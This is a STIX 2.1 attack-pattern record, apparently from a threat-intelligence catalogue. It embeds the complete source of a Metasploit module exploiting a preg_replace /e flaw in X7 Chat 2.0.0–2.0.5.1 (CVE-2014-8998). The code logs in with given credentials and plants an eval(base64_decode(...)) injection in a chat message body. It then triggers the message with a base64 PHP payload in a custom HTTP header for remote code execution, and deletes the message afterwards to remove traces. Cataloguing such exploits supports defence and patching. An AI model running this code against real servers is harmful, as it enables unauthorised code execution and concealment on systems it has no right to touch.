{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba8e0f2d-3150-47ac-9ed2-23a79f215b5b",
    "created": "2024-08-14T17:08:21.469473Z",
    "modified": "2024-08-14T17:08:21.469477Z",
    "name": "X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution",
    "description": " This module exploits a post-auth vulnerability found in X7 Chat versions 2.0.0 up to 2.0.5.1. The vulnerable code exists on lib/message.php, which uses preg_replace() function with the /e modifier. This allows a remote authenticated attacker to execute arbitrary PHP code in the remote machine.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/x7chat2_php_exec.rb",
            "external_id": "x7chat2_php_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8998"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/4076"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution',\n      'Description'    => %q{\n        This module exploits a post-auth vulnerability found in X7 Chat versions\n        2.0.0 up to 2.0.5.1. The vulnerable code exists on lib/message.php, which\n        uses preg_replace() function with the /e modifier. This allows a remote\n        authenticated attacker to execute arbitrary PHP code in the remote machine.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Fernando Munoz <fernando[at]null-life.com>', # discovery & module development\n          'Juan Escobar <eng.jescobar[at]gmail.com>', # module development @itsecurityco\n        ],\n      'References'     =>\n        [\n          [ 'BID', '71014' ],\n          [ 'CVE', '2014-8998' ],\n          # Using this URL because isn't nothing else atm\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/4076']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Generic (PHP Payload)', {}]],\n      'DisclosureDate' => '2014-10-27',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('USERNAME', [ true, 'Username to authenticate as', '']),\n        OptString.new('PASSWORD', [ true, 'Pasword to authenticate as', '']),\n        OptString.new('TARGETURI', [ true, 'Base x7 Chat directory path', '/x7chat2']),\n      ])\n  end\n\n  def check\n    res = exec_php('phpinfo(); die();', true)\n\n    if res && res.body =~ /This program makes use of the Zend/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exec_php(php_code, is_check = false)\n\n    # remove comments, line breaks and spaces of php_code\n    payload_clean = php_code.gsub(/(\\s+)|(#.*)/, '')\n\n    # clean b64 payload (we can not use quotes or apostrophes and b64 string must not contain equals)\n    while Rex::Text.encode_base64(payload_clean) =~ /=/\n      payload_clean = \"#{ payload_clean } \"\n    end\n    payload_b64 = Rex::Text.encode_base64(payload_clean)\n\n    cookie_x7c2u = \"X7C2U=#{ datastore['USERNAME'] }\"\n    cookie_x7c2p = \"X7C2P=#{ Rex::Text.md5(datastore['PASSWORD']) }\"\n    rand_text = Rex::Text.rand_text_alpha_upper(5, 8)\n\n    print_status(\"Trying for version 2.0.2 up to 2.0.5.1\")\n    print_status(\"Sending offline message (#{ rand_text }) to #{ datastore['USERNAME'] }...\")\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'index.php'),\n      'headers'  => {\n        'Cookie' => \"#{ cookie_x7c2u }; #{ cookie_x7c2p };\",\n      },\n      'vars_get' => {\n        # value compatible with 2.0.2 up to 2.0.5.1\n        'act'     => 'user_cp',\n        'cp_page' => 'msgcenter',\n        'to'      => datastore['USERNAME'],\n        'subject' => rand_text,\n        'body'    => \"#{ rand_text }www.{${eval(base64_decode($_SERVER[HTTP_#{ rand_text }]))}}.c#{ rand_text }\",\n      }\n    })\n\n    unless res && res.code == 200\n      print_error(\"Sending the message (#{ rand_text }) has failed\")\n      return false\n    end\n\n    if res.body =~ /([0-9]*)\">#{ rand_text }/\n      message_id = Regexp.last_match[1]\n      user_panel = 'user_cp'\n    else\n      print_error(\"Could not find message (#{ rand_text }) in the message list\")\n\n      print_status(\"Retrying for version 2.0.0 up to 2.0.1 a1\")\n      print_status(\"Sending offline message (#{ rand_text }) to #{ datastore['USERNAME'] }...\")\n      res = send_request_cgi({\n        'method'   => 'GET',\n        'uri'      => normalize_uri(target_uri.path, 'index.php'),\n        'headers'  => {\n          'Cookie' => \"#{ cookie_x7c2u }; #{ cookie_x7c2p };\",\n        },\n        'vars_get' => {\n          # value compatible with 2.0.0 up to 2.0.1 a1\n          'act'     => 'usercp',\n          'cp_page' => 'msgcenter',\n          'to'      => datastore['USERNAME'],\n          'subject' => rand_text,\n          'body'    => \"#{ rand_text }www.{${eval(base64_decode($_SERVER[HTTP_#{ rand_text }]))}}.c#{ rand_text }\",\n        }\n      })\n\n      unless res && res.code == 200\n        print_error(\"Sending the message (#{ rand_text }) has failed\")\n        return false\n      end\n\n      if res.body =~ /([0-9]*)\">#{ rand_text }/\n        message_id = Regexp.last_match[1]\n        user_panel = 'usercp'\n      else\n        print_error(\"Could not find message (#{ rand_text }) in the message list\")\n        return false\n      end\n    end\n\n    print_status(\"Accessing message (#{ rand_text })\")\n    print_status(\"Sending payload in HTTP header '#{ rand_text }'\")\n\n    if is_check\n      timeout = 20\n    else\n      timeout = 3\n    end\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'index.php'),\n      'headers'   => {\n        'Cookie'  => \"#{ cookie_x7c2u }; #{ cookie_x7c2p };\",\n        rand_text => payload_b64,\n      },\n      'vars_get'  => {\n        'act'     => user_panel,\n        'cp_page' => 'msgcenter',\n        'read'    => message_id,\n      }\n    }, timeout)\n\n    res_payload = res\n\n    print_status(\"Deleting message (#{ rand_text })\")\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'index.php'),\n      'headers'  => {\n        'Cookie' => \"#{ cookie_x7c2u }; #{ cookie_x7c2p };\",\n      },\n      'vars_get' => {\n        'act'     => user_panel,\n        'cp_page' => 'msgcenter',\n        'delete'  => message_id,\n      }\n    })\n\n    if res && res.body =~ /The message has been deleted/\n      print_good(\"Message (#{ rand_text }) removed\")\n    else\n      print_error(\"Removing message (#{ rand_text }) has failed\")\n      return false\n    end\n\n    # if check return the response\n    if is_check\n      return res_payload\n    else\n      return true\n    end\n  end\n\n  def exploit\n    unless exec_php(payload.encoded)\n      fail_with(Failure::Unknown, \"#{peer} - Exploit failed, aborting.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-27",
    "x_mitre_platforms": [
        "php'"
    ]
}